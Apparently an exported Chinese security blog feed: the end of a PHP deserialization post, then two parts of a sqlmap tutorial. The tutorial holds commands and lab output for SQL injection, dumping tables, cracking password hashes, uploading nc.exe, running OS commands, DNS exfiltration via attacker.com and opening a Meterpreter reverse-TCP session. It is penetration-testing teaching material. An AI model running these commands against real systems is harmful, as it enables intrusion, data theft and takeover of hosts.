$fp = fopen(\"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\temp\\\\hello.php\",\"w\"); fputs($fp,$this-&gt;target); fclose($fp); }}$test = $_GET['test'];test_unser = unserialize($test);echo \"hello.php&lt;br/&gt;\";include (\".\\hello.php\");?&gt; 可以看到__wakeup()函数把test的值重置为”wakeup！”。 我们更改序列化中的属性个数为3，发现__wakeup()函数没有执行了。 0x03 总结php反序列化漏洞的重点在于参数能不能可控，如果可控就可能存在反序列化漏洞。这里只是暂时对原理进行了简单分析，php漏洞如何挖掘可以参考这篇文章。 参考文献：PHP反序列化漏洞学习总结如果你在准备面试，这个知识点一定要get！","link":"/2019/03/08/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"title":"Sqlmap命令行（其二）","text":"我近来时时感到，很需要到一处完全听不见电车、火车声响的地方，好好睡一睡，想一想，哪怕只是一天也好。为此，我有了旅行的欲望。 ——谷崎润一郎《阴翳礼赞》 接上一篇Sqlmap命令行（其一） 0x08 检测1.检测级别参数：–level此参数用于指定检测级别，有1~5共5级。默认为1，表示做最少的检测，相应的，5级表示做最多的检测。Sqlmap使用的payload保存在目录xml/payloads/中，是xml格式的，可以自己定制。节选一个payload如下所示： 12345678910111213141516&lt;test&gt; &lt;title&gt;AND boolean-based blind - WHERE or HAVING clause (Generic comment)&lt;/title&gt; &lt;stype&gt;1&lt;/stype&gt; &lt;level&gt;2&lt;/level&gt; &lt;risk&gt;1&lt;/risk&gt; &lt;clause&gt;1&lt;/clause&gt; &lt;where&gt;1&lt;/where&gt; &lt;vector&gt;AND [INFERENCE]&lt;/vector&gt; &lt;request&gt; &lt;payload&gt;AND [RANDNUM]=[RANDNUM]&lt;/payload&gt; &lt;comment&gt;[GENERIC_SQL_COMMENT]&lt;/comment&gt; &lt;/request&gt; &lt;response&gt; &lt;comparison&gt;AND [RANDNUM]=[RANDNUM1]&lt;/comparison&gt; &lt;/response&gt;&lt;/test&gt; 在上例中可以看到有level标签，其值为2，该payload在检测级别大于等于2时被使用。risk标签的含义见后文。 检测级别不仅会影响payload的使用，还会影响注入点的检测，GET和POST参数是一直会被检测的，检测级别大于等于2时会检测cookie是否有注入，检测级别大于等于3时会检测User-Agent和Referer是否有注入。 若不是很清楚注入点在哪里可以设置一个比较高的检测级别。 强烈建议在向Sqlmap官方报告一个明确存在的注入漏洞检测不出来前先把检测级别调高试试。2.风险等级参数：–risk此参数用于指定风险等级，有1~4共4级。默认风险等级为1，此等级在大多数情况下对测试目标无害。风险等级2添加了基于时间的注入测试，等级3添加了OR测试。 若注入点是在UPDATE语句中，使用OR测试可能会修改整个表的数据，这显然不是攻击者想要看到的。因此用户需要能控制风险等级避开有潜在风险的payload。 3.页面对比参数：–string、–not-string、–regexp默认情况下在布尔型注入中Sqlmap通过比较返回页面内容来判断True或False。但有时页面每次刷新都会不同，如页面中有动态广告。Sqlmap会尽力判断出页面中动态的部分来，但并不总能成功。用户可以用参数“–string”指出代表True的页面会包含而代表False的页面不会包含的字符串以供Sqlmap判断True或False，若这样的字符串是变动的还可以用参数“–regexp”指定一个正则表达式去匹配这样的字符串。或者用参数“–not-string”指出代表False的页面会包含而代表True的页面不会包含的字符串。 参数：–code或者更简单地，若是用户知道代表True的页面HTTP状态码为200而代表False的页面HTTP状态码不为200比如是401，可以用“–code”参数告诉告诉Sqlmap这一信息，如“–code=200”。 参数：–titles若是用户知道代表True的页面title和代表False的页面title不同，如代表True的页面title为“Welcome”，代表False的页面title为“Forbidden”，就可以使用参数“–titles”让Sqlmap依据title来判断True或False。 参数：–text-only若是HTTP响应体中有许多诸如JavaScript之类的活动内容，可以使用参数“–text-only”让Sqlmap只专注于纯文本内容。 0x09 注入技术这些参数用于对特定的SQL注入技术进行调整。1.检测时所用技术参数：–technique此参数用于指定检测注入时所用技术。默认情况下Sqlmap会使用自己支持的全部技术进行检测。此参数后跟表示检测技术的大写字母，其值为B、E、U、S、T或Q，含义如下： B：Boolean-based blind（布尔型注入） E：Error-based（报错型注入） U：Union query-based（可联合查询注入） S：Stacked queries（可多语句查询注入） T：Time-based blind（基于时间延迟注入） Q：Inline queries（嵌套查询注入）可以用“–technique ES”来指定使用两种检测技术。“–technique BEUSTQ”与默认情况等效。想要访问文件系统或是Windows的注册表就一定要添加“S”进行多语句查询注入测试。 2.基于时间延迟注入中延时设置参数：–time-sec用此参数设置基于时间延迟注入中延时时长，默认为5秒。 3.联合查询注入中列数设置参数：–union-cols在进行联合查询注入时，Sqlmap会自动检测列数，范围是1到10。当level值较高时列数检测范围的上限会扩大到50。可以用此参数指定列数检测范围，如“–union-cols 12-16”就会让Sqlmap的列数检测范围变成12到16。 4.联合查询注入中字符设置参数：–union-char默认情况下Sqlmap进行联合查询注入时使用空字符（NULL）。但当level值较高时Sqlmap会生成随机数用于联合查询注入。因为有时使用空字符注入会失败而使用随机数会成功。 使用此参数可以指定联合查询注入中使用的字符，如：“–union-char 123”。 “联合查询注入中使用的字符”究竟是什么意思呢？请看下面两个例子： 第一个例子，不使用“–union-char”，默认情况下联合查询注入中使用的字符为空字符（NULL）： 1python sqlmap.py -u \"http://192.168.56.101/user.php?id=001\" --technique U -v 3 部分输出为： 12[10:59:15] [PAYLOAD] 001 UNION ALL SELECT NULL,CONCAT(0x71707a6271,0x66546c7770497458576f6455476761654654745744684c5062585971794c556d55454a6c49525675,0x7162767671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- FAcV[10:59:15] [PAYLOAD] 001 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71707a6271,0x6b43674e76687959526b6452627255787373675a6f5a436f7266756d49424547496d506779456170,0x7162767671),NULL,NULL,NULL,NULL,NULL-- caXD 第一个例子，使用“–union-char 123”，指定联合查询注入中使用的字符为“123”： 1python sqlmap.py -u \"http://192.168.56.101/user.php?id=001\" --technique U -v 3 --union-char 123 部分输出为： 12[10:59:30] [PAYLOAD] 001 UNION ALL SELECT 123,123,123,123,123,123,123,123,123,123,123,CONCAT(0x716b707171,0x776c71686e54726659424b49616d68756e64734d45774c4c7163494345794255784557597a484244,0x7178627071)-- aUXO[10:59:30] [PAYLOAD] 001 UNION ALL SELECT 123,123,123,123,123,123,123,123,123,123,CONCAT(0x716b707171,0x6f5278444767675156496c724563714e6568634c6b5950646a6f4e53516b776d77474e7141425273,0x7178627071),123-- lPHb 仔细观察上示两例的输出就能明白“联合查询注入中使用的字符”就是“UNION ALL SELECT XXX, XXX”中的“XXX”。 5.联合查询注入中表名设置参数：–union-from有些情况下在联合查询中必须指定一个有效和可访问的表名，否则联合查询会执行失败，如在微软的Access中。（也就是说，某些DBMS不支持“SELECT 1,2;”这样的语句，SELECT必须有FROM。）用此参数指定这个表名，如：“–union-from=users”。 6.DNS泄露攻击参数：–dns-domainSQL注入中的DNS泄露攻击详情见论文《Data Retrieval over DNS in SQL Injection Attacks》。 假设攻击者控制着某域名（例如：attacker.com）的域名解析服务器，即查询该域名的子域名对应的IP地址都会到这台域名解析服务器来查询。这时攻击者就可以使用“–dns-domain attacker.com”来进行DNS泄露攻击。 实际上若是攻击者没有控制任何一台域名解析服务器，那么她可以注册一个新域名，再自己搭建一台域名解析服务器用于接受数据。 7.二阶注入攻击参数：–second-order有时注入结果显示在别的页面，此时需要用此参数指明显示注入结果的页面，该参数后跟一个URL。 0x0A 指纹默认地Sqlmap会自动对注入目标进行数据库管理系统指纹识别。参数：-f或–fingerprint若想执行更广泛的数据库管理系统指纹识别可以添加此参数。 参数：-b或–banner若想得到更精确的指纹识别结果可以添加此参数，详情见后文。 0x0B 暴力破解1.暴力破解表名参数：–common-tables有些情况下用“–tables”不能列出数据库中表名来，如： 版本小于5.0的MySQL没有information_schema表 微软Access的MSysObjects表默认不可读 数据库用户权限过低无法读取表名当无法读出表名时可以使用参数“–common-tables”暴力破解表名，该参数使用的字典是txt/common-tables.txt，其中存储了常见表名，可以手动编辑该文件。 2.暴力破解列名参数：–common-columns有些情况下用“–columns”不能列出数据表中列名来，如： 版本小于5.0的MySQL没有information_schema表 微软Access的MSysObjects表默认不可读 数据库用户权限过低无法读取列名当无法读出列名时可以使用参数“–common-columns”暴力破解列名，该参数使用的字典是txt/common-columns.txt，其中存储了常见列名，可以手动编辑该文件。 0x0C 列举数据这些参数用于列举出数据库管理系统信息、数据结构和数据内容。1.一键列举全部数据参数：–all使用这一个参数就能列举所有可访问的数据。但不推荐使用，因为这会发送大量请求，把有用和无用的信息都列举出来。 2.列举数据库管理系统信息参数：-b或–banner大多数的现代数据库管理系统都有一个函数或是环境变量能够返回数据库管理系统的版本号和最后的补丁级别以及底层的操作系统信息。通常这个函数是version()、环境变量是@@version，当然要看目标数据库管理系统了。使用参数“-b”或“–banner”来列举数据库管理系统的这一信息。 下例中的数据库是Oracle： 1python sqlmap.py -u \"http://192.168.136.131/sqlmap/oracle/get_int.php?id=1\" --banner 部分输出为： 1234[09:54:30] [INFO] fetching bannerweb application technology: PHP 5.2.6, Apache 2.2.9back-end DBMS: Oraclebanner: 'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod' 下例中的数据库是Mysql： 1python sqlmap.py -u \"http://192.168.56.102/user.php?id=1\" --banner 部分输出为： 1234[09:56:32] [INFO] fetching bannerback-end DBMS operating system: Linux Ubuntuback-end DBMS: MySQL &gt;= 5.0banner: '5.5.50-0ubuntu0.14.04.1' 3.列举当前用户参数：–current-user使用这一参数有可能将执行SQL语句的用户列举出来。 4.列举当前数据库参数：–current-db使用这一参数有可能将WEB应用连接的数据库名列举出来。 5.列举服务器主机名参数：–hostname使用这一参数有可能将数据库管理系统所在计算机的主机名列举出来，如： 1python sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/get_int.php?id=1\" --hostname 部分输出如下： 123[xx:xx:04] [INFO] fetching server hostname[xx:xx:04] [INFO] retrieved: debian-5.0-i386hostname: 'debian-5.0-i386' 6.检测当前用户是否是管理员参数：–is-dba使用这一参数有可能能够检测当前用户是否是管理员，若是管理员则返回True，否则返回False。如： 1python sqlmap.py -u \"http://192.168.56.102/user.php?id=1\" --is-dba 部分输出为： 1234[10:05:16] [INFO] testing if current user is DBA[10:05:16] [INFO] fetching current user[10:05:16] [WARNING] reflective value(s) found and filtering outcurrent user is DBA: True 7.列举数据库管理系统中的用户参数：–users当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中的用户。 8.列举并破解数据库管理系统用户密码Hash值参数：–passwords当前用户有读取包含了数据库管理系统中用户密码Hash值的系统表的权限时使用这一参数可以列举数据库管理系统中用户密码Hash值。Sqlmap会先列举用户，再列举用户密码Hash值。 下面是一个以PostgreSQL为目标的例子： 1python sqlmap.py -u \"http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1\" --passwords -v 1 部分输出如下所示： 1234567891011121314151617back-end DBMS: PostgreSQL[hh:mm:38] [INFO] fetching database users password hashesdo you want to use dictionary attack on retrieved password hashes? [Y/n/q] y[hh:mm:42] [INFO] using hash method: 'postgres_passwd'what's the dictionary's location? [/software/sqlmap/txt/wordlist.txt][hh:mm:46] [INFO] loading dictionary from: '/software/sqlmap/txt/wordlist.txt'do you want to use common password suffixes? (slow!) [y/N] n[hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)[hh:mm:49] [INFO] found: 'testpass' for user: 'testuser'[hh:mm:50] [INFO] found: 'testpass' for user: 'postgres'database management system users password hashes:[*] postgres [1]: password hash: md5d7d880f96044b72d0bba108ace96d1e4 clear-text password: testpass[*] testuser [1]: password hash: md599e5ea7a6f7c3269995cba3927fd0093 clear-text password: testpass Sqlmap不仅会列举出密码Hash，还会解析密码Hash格式，并询问用户是否要通过密码字典的方式破解Hash值寻找出明文密码。 若想只枚举特定用户的密码使用参数“-U”指定用户，可用“CU”来代表当前用户，如： 1python sqlmap.py -u \"http://192.168.56.102/user.php?id=1\" --password -U CU 部分输出如下： 1234database management system users password hashes:[*] root [1]: password hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B clear-text password: root 9.列举数据库管理系统的用户权限参数：–privileges当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的权限。通过用户权限可以判断哪些用户是管理员。 若想只枚举特定用户的权限使用参数“-U”指定用户，可用“CU”来代表当前用户。 若目标是微软的SQL Server，这一参数会列出每个用户是否是管理员而不列出每个用户的具体权限。 10.列举数据库管理系统的用户角色参数：–roles当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的角色。 若想只枚举特定用户的角色使用参数“-U”指定用户，可用“CU”来代表当前用户。 官方手册上说只有目标数据库管理系统是Oracle时这一功能才可用，但我在Mysql中测试也是可用的。 11.列举数据库管理系统中的所有数据库参数：–dbs当前用户有读取包含了数据库管理系统中可用数据库信息的系统表的权限时使用这一参数可以列举数据库管理系统中所有数据库。 12.列举数据库数据库的所有表参数：–tables、–exclude-sysdbs和-D当前用户有读取包含了数据库管理系统中可用数据库中数据表信息的系统表的权限时使用参数“–tables”可以列举用参数“-D”指定的数据库中的所有数据表。若没有用参数“-D”指定数据库，只使用参数“–tables”会列举所有数据库中所有表。如： 1python sqlmap.py -u \"http://192.168.56.102/user.php?id=1\" -D DBName --tables 使用参数“–exclude-sysdbs”可排除系统数据库。在Oracle中要指定TABLESPACE_NAME而不是数据库名。13.列举数据表的所有列参数：–columns、-C、-T和-D如权限允许，使用参数“–columns”可以列出用“-D”指定的数据库中用“-T”指定的表中的所有列的名字和数据类型。若没有指定数据库则会默认使用当前数据库。还可以用“-C”指定感兴趣的某几列这样就不用列出所有列来。 下面是以SQLite为目标的例子： 1python sqlmap.py -u \"http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1\" --columns -D testdb -T users 部分输出如下： 12345678910Database: SQLite_masterdbTable: users[3 columns]+---------+---------+| Column | Type |+---------+---------+| id | INTEGER || name | TEXT || surname | TEXT |+---------+---------+","link":"/2019/03/25/Sqlmap%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%88%E5%85%B6%E4%BA%8C%EF%BC%89/"},{"title":"Sqlmap命令行（其三）","text":"0x0D 列举数据库管理系统的模式参数：–schema和–exclude-sysdbs用户可用此选项列举数据库管理系统的模式。模式列表包含所有数据库、表、列、触发器和他们各自的类型。同样地，可使用参数“–exclude-sysdbs”排除系统数据库。 下面是的例子测试对象是Mysql:部分输出如下： 12345678910111213141516171819202122232425262728293031[...]Database: mysqlTable: procs_priv[8 columns]+--------------+----------------------------------------+| Column | Type |+--------------+----------------------------------------+| Timestamp | timestamp || User | char(16) || Db | char(64) || Grantor | char(77) || Host | char(60) || Proc_priv | set('Execute','Alter Routine','Grant') || Routine_name | char(64) || Routine_type | enum('FUNCTION','PROCEDURE') |+--------------+----------------------------------------+[...]Database: mysqlTable: ndb_binlog_index[7 columns]+-----------+---------------------+| Column | Type |+-----------+---------------------+| Position | bigint(20) unsigned || deletes | bigint(20) unsigned || epoch | bigint(20) unsigned || File | varchar(255) || inserts | bigint(20) unsigned || schemaops | bigint(20) unsigned || updates | bigint(20) unsigned |+-----------+---------------------+ 1.列举表中数据条数参数：–count有时我们只想知道有多少数据而不想知道具体的数据内容，此时就可以使用该参数。如： 1python sqlmap.py -u \"http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1\" --count -D testdb 部分输出如下： 1234567Database: testdb+----------------+---------+| Table | Entries |+----------------+---------+| dbo.users | 4 || dbo.users_blob | 2 |+----------------+---------+ 2.列举表中数据参数：–dump、-C、-T、-D、–start、–stop和–where权限允许时可以列举表中数据。用参数“-D”指定数据库，用参数“-T”指定数据表，用参数“-C”指定目标列。若只指定了数据表而没有指定数据库则默认使用当前数据库。若没有指定列则列举表中全部列。下例是以Firebird为目标： 1python sqlmap.py -u \"http://192.168.136.131/sqlmap/firebird/get_int.php?id=1\" --dump -T users 部分输出如下： 1234567891011Database: Firebird_masterdbTable: USERS[4 entries]+----+--------+------------+| ID | NAME | SURNAME |+----+--------+------------+| 1 | luther | blisset || 2 | fluffy | bunny || 3 | wu | ming || 4 | NULL | nameisnull |+---+--------+-------------+ 只使用参数“–dump”和“-D”可以一次性列举整个数据库中所有数据。 Sqlmap会自动将参数“–dump”列举的数据保存到CSV格式文件中，文件具体路径会在Sqlmap的输出中给出，如： 1python sqlmap.py -u \"http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1\" -D DSSchool --dump 部分输出为： 123456789101112[11:15:27] [INFO] analyzing table dump for possible password hashesDatabase: DSSchoolTable: T_SCORESYSTEMTEACHERS[2 entries]+-----+----------+-------+---------+----------+| AGE | NAME | TITLE | ACCOUNT | PASSWORD |+-----+----------+-------+---------+----------+| 21 | neo | ?? | 001 | 001 || 31 | morphine | ?? | 002 | 002 |+-----+----------+-------+---------+----------+ [11:15:27] [INFO] table 'DSSchool.T_SCORESYSTEMTEACHERS' dumped to CSV file '/home/werner/.sqlmap/output/192.168.56.102/dump/DSSchool/T_SCORESYSTEMTEACHERS.csv' 截取的输出中最后一行便是CSV文件保存的路径。 若只想列举部分数据可以使用参数“–start”和“–stop”。如只想列举第一条数据可以添加“–stop 1”，只想列举第二和第三条数据可以添加“–start 1 –stop 3”，可见这是一个左开右闭区间。区间范围仅在盲注中有效，因为在基于错误信息的注入和联合查询注入中区间范围会被忽略。 除了用区间范围限制列举的数据外，还可以用“–where”参数来限制列举的数据。“–where”参数会被Sqlmap转换成WHERE子句，如“–where id&gt;3”会只列举列id的值大于3的数据。 如你所见，Sqlmap十分灵活。可以囫囵地列举整个数据库，也可以细致地在表中选择列，在列中又选择特定数据。3.列举所有数据库所有表中所有数据参数：–dump-all和–exclude-sysdbs使用参数“–dump-all”可列举所有数据库所有表中所有数据。同样地，可使用参数“–exclude-sysdbs”排除系统数据库。 注意微软SQL Server的master数据库不属于系统数据库，因为有些管理员会在这个数据库中存储用户数据。4.在数据库、表、列中搜索参数：–search、-C、-T和-D可以搜索数据库名，在所有数据库中搜索表名，在所有数据库的所有表中搜索列名。参数“–search”要和下列参数之一配合使用： -C：后跟以逗号分隔的列名，在整个数据库管理系统中搜索 -T：后跟以逗号分隔的表名，在整个数据库管理系统中搜索 -D：后跟以逗号分隔的库名，在整个数据库管理系统中搜索在搜索时，Sqlmap会询问用户进行精确搜索还是包含搜索。默认为包含搜索，即搜索的字符串包含于结果中就认为命中。精确搜索要求搜索的字符串与结果完全相等。5.运行自定义的SQL语句参数：–sql-query和–sql-shell这一功能允许执行任意的SQL语句，Sqlmap会自动解析给出的SQL语句，选择恰当的注入技术并将给出的SQL语句打包到payload中。 如果查询是个SELECT语句，Sqlmap会返回查询结果。如果Web应用使用的数据库管理系统支持多语句查询，Sqlmap会使用堆注入技术。但要注意Web应用可能不支持堆查询，例如PHP使用Mysql时不支持堆查询，但使用PostgreSQL时支持堆查询。 下例的目标是SQL Server 2000： 1python sqlmap.py -u \"http://192.168.136.131/sqlmap/mssql/get_int.php?id=1\" --sql-query \"SELECT 'foo'\" -v 1 部分输出如下： 1234[hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''[hh:mm:14] [INFO] retrieved: fooSELECT 'foo':'foo' 1python sqlmap.py -u \"http://192.168.136.131/sqlmap/mssql/get_int.php?id=1\" --sql-query \"SELECT 'foo', 'bar'\" -v 2 部分输出如下： 123456789101112[hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will nowunpack it into distinct queries to be able to retrieve the output even if we aregoing blind[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) ASVARCHAR(8000)), (CHAR(32)))[hh:mm:50] [INFO] retrieved: foo[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VARCHAR(8000)), (CHAR(32)))[hh:mm:50] [INFO] retrieved: bar[hh:mm:50] [DEBUG] performed 27 quer 如你所见，Sqlmap将提供的SQL语句分成了两个不同的SELECT语句，并分别返回结果。 参数“–sql-shell”提供一个交互式的SQL语句执行环境，支持Tab键补全和命令历史记录。如： 1python sqlmap.py -u \"http://192.168.56.102/user.php?id=1\" --sql-shell 部分输出如下： 123456789101112[15:06:47] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTERsql-shell&gt; select 'foo';[15:07:41] [INFO] fetching SQL SELECT statement query output: 'select 'foo''select 'foo';: 'foo'sql-shell&gt; select password from mysql.user where user='root';[15:07:42] [INFO] fetching SQL SELECT statement query output: 'select password from mysql.user where user='root''select password from mysql.user where user='root'; [1]:[*] *81F5E21E35407D884A6CD4A731AEBFB6AF209E1Bsql-shell&gt; show tables;[15:11:15] [INFO] fetching SQL SELECT statement query output: 'show tables'[15:11:15] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries)show tables; [1]: 0x0E UDF注入参数：–udf-injectUDF是“user-defined function”的缩写，UDF是一种针对MySQL和PostgreSQL的高级注入技术，详情见《Advanced SQL injection to operating system full control》。 可以编译MySQL或PostgreSQL的共享库、DLL（Windows）和共享对象（Linux/Unix）并将这些文件在本机上的路径提供给Sqlmap来进行UDF注入。Sqlmap会先问一些问题然后上传UDF文件并创建UDF最后根据问题答案执行UDF。完成UDF注入后，Sqlmap会删除上传的UDF文件。 参数：–shared-lib添加此参数Sqlmap会在运行时询问共享库文件路径。 在Sqlmap安装目录的udf目录中有许多UDF文件，按照DMBS、操作系统、位数和版本归类，可以直接使用。 0X0F 访问文件系统1.读取文件参数：–file-read当数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有读取文件相关权限时读取文件是可行的。读取的文件既可以是文件文件也可以是二进制文件，Sqlmap会处理好的。下例的目标数据库管理系统是SQL Server 2005： 1python sqlmap.py -u \"http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther\" --file-read \"C:/example.exe\" -v 1 部分输出如下： 12345678[hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2000web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2005[hh:mm:50] [INFO] fetching file: 'C:/example.exe'[hh:mm:50] [INFO] the SQL query provided returns 3 entriesC:/example.exe file saved to:'/software/sqlmap/output/192.168.136.129/files/C__example.exe' 然后查看下载的文件： 1234$ ls -l output/192.168.136.129/files/C__example.exe-rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C__example.exe$ file output/192.168.136.129/files/C__example.exeoutput/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel 80386 32-bit 2.上传文件参数：–file-write和–file-dest当数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有写文件相关权限时上传文件是可行的。上传的文件既可以是文件文件也可以是二进制文件，Sqlmap会处理好的。下例的目标数据库管理系统是MySQL，上传了一个二进制的UPX压缩文件： $ file /software/nc.exe.packed /software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit $ ls -l /software/nc.exe.packed -rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed $ python sqlmap.py -u &quot;http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot; -\\ -file-write &quot;/software/nc.exe.packed&quot; --file-dest &quot;C:/WINDOWS/Temp/nc.exe&quot; -v 1 [...] [hh:mm:29] [INFO] the back-end DBMS is MySQL web server operating system: Windows 2003 or 2008 web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727 back-end DBMS: MySQL &gt;= 5.0.0 [...] do you want confirmation that the file &apos;C:/WINDOWS/Temp/nc.exe&apos; has been success fully written on the back-end DBMS file system? [Y/n] y [hh:mm:52] [INFO] retrieved: 31744 [hh:mm:52] [INFO] the file has been successfully written and its size is 31744 b ytes, same size as the local file &apos;/software/nc.exe.packed&apos;0x10 操作系统控制1.执行任意操作系统命令参数：–os-cmd和–os-shell若数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有相关权限Sqlmap就能利用SQL注入执行任意的操作系统命令。 当数据库管理系统是MySQL或PostgreSQL时，Sqlmap会通过前面介绍过的文件上传功能上传一个包含用户自定义函数sys_exec()和sys_eval()的二进制共享库文件，然后创建这两个用户自定义函数，通过这两个函数之一来执行用户指定的命令。选择哪个函数取决于用户是否想要显示命令执行的标准输出。 当数据库管理系统是微软的SQL Server时，Sqlmap通过存储过程xp_cmdshell来执行任意命令。若xp_cmdshell被禁用（SQL Server &gt;= 2005时默认禁用）Sqlmap会启用它；若xp_cmdshell不存在，Sqlmap会创建它。 当用户想要看到命令执行的标准输出时，Sqlmap使用可列举的注入技术（盲注、带内和基于错误的注入），而当用户不想看到命令执行的标准输出时，堆查询注入技术将被用于执行命令。 下例的目标是PostgreSQL： 1python sqlmap.py -u \"http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1\" --os-cmd id -v 1 部分输出如下所示： 123456789101112131415161718web application technology: PHP 5.2.6, Apache 2.2.9back-end DBMS: PostgreSQL[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system[hh:mm:12] [INFO] the back-end DBMS operating system is Linux[hh:mm:12] [INFO] testing if current user is DBA[hh:mm:12] [INFO] detecting back-end DBMS version from its banner[hh:mm:12] [INFO] checking if UDF 'sys_eval' already exist[hh:mm:12] [INFO] checking if UDF 'sys_exec' already exist[hh:mm:12] [INFO] creating UDF 'sys_eval' from the binary UDF file[hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF filedo you want to retrieve the command standard output? [Y/n/a] ycommand standard output:'uid=104(postgres) gid=106(postgres) groups=106(postgres)'[hh:mm:19] [INFO] cleaning up the database management systemdo you want to remove UDF 'sys_eval'? [Y/n] ydo you want to remove UDF 'sys_exec'? [Y/n] y[hh:mm:23] [INFO] database management system cleanup finished[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system can only be deleted manually 使用参数“–os-shell”可以模拟一个可以执行任意命令的shell，和“–sql-shell”一样这个shell也可以用Tab键补全，支持历史记录。 当堆查询不被支持（如PHP或ASP+Mysql）且数据库管理系统是MySQL时，仍然可以通过SELECT的从句INTO OUTFILE在Web所在主机的可写目录创建一个Web后门，通过这个Web后门来执行命令。Sqlmap支持这一技术并要求用户提供一些用逗号分割的可能是可写目录的路径。Sqlmap支持以下这些服务器端脚本语言： ASP ASP.NET JSP PHP2.带外TCP连接：Meterpreter及相关参数：–os-pwn、–os-smbrelay、–os-bof、–priv-esc、–msf-path和–tmp-path若数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有相关权限Sqlmap就有可能在攻击者的主机和数据库所在主机之间建立带外TCP连接。根据用户的选择，此连接可以是交互式命令shell，Meterpreter会话或图形用户界面（VNC）会话。 Sqlmap要靠Metasploit生成shellcode，在数据库所在主机执行shellcode有以下四种技术： 数据库通过Sqlmap创建的用户自定义函数sys_bineval()在内存中执行Metasploit的shellcode。支持MySQL和PostgreSQL。参数“–os-pwn”。 通过Sqlmap自己的用户自定义函数（MySQL和PostgreSQL中的sys_exec()，微软SQL Server中的xp_cmdshell()）上传并执行Metasploit的“stand-alone payload stager”。参数：“–os-pwn”。 利用远程代码执行漏洞MS08-068。攻击者的机器要用Metasploit的smb_relay监听来自目标机器的连接。要求在Linux/Unix上以root权限运行Sqlmap且目标DBMS在Windows上以管理员权限运行。参数：“–os-smbrelay”。 在微软SQL Server 2000和2005中可通过存储过程sp_replwritetovarbin的堆缓冲区溢出漏洞（MS09-004）在内存中执行Metasploit的shellcode。Sqlmap有自己的数据执行保护绕过技术可以成功利用漏洞，但需要Metasploit生成shellcode以便在成功利用漏洞时执行shellcode。参数：“–os-bof”。下面是以MySQL为目标的例子： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485python sqlmap.py -u \"http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1\" --os-pwn --msf-path /software/metasploit [...][hh:mm:31] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: MySQL 5.0[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system[hh:mm:31] [INFO] the back-end DBMS operating system is Windowshow do you want to establish the tunnel?[1] TCP: Metasploit Framework (default)[2] ICMP: icmpsh - ICMP tunneling&gt;[hh:mm:32] [INFO] testing if current user is DBA[hh:mm:32] [INFO] fetching current userwhat is the back-end database management system architecture?[1] 32-bit (default)[2] 64-bit&gt;[hh:mm:33] [INFO] checking if UDF 'sys_bineval' already exist[hh:mm:33] [INFO] checking if UDF 'sys_exec' already exist[hh:mm:33] [INFO] detecting back-end DBMS version from its banner[hh:mm:33] [INFO] retrieving MySQL base directory absolute path[hh:mm:34] [INFO] creating UDF 'sys_bineval' from the binary UDF file[hh:mm:34] [INFO] creating UDF 'sys_exec' from the binary UDF filehow do you want to execute the Metasploit shellcode on the back-end database underlying operating system?[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)[2] Stand-alone payload stager (file system way)&gt;[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcodewhich connection type do you want to use?[1] Reverse TCP: Connect back from the database host to this machine (default)[2] Reverse TCP: Try to connect back from the database host to this machine, onall portsbetween the specified and 65535[3] Bind TCP: Listen on the database host for a connection&gt;which is the local address? [192.168.136.1]which local port number do you want to use? [60641]which payload do you want to use?[1] Meterpreter (default)[2] Shell[3] VNC&gt;[hh:mm:40] [INFO] creation in progress ... 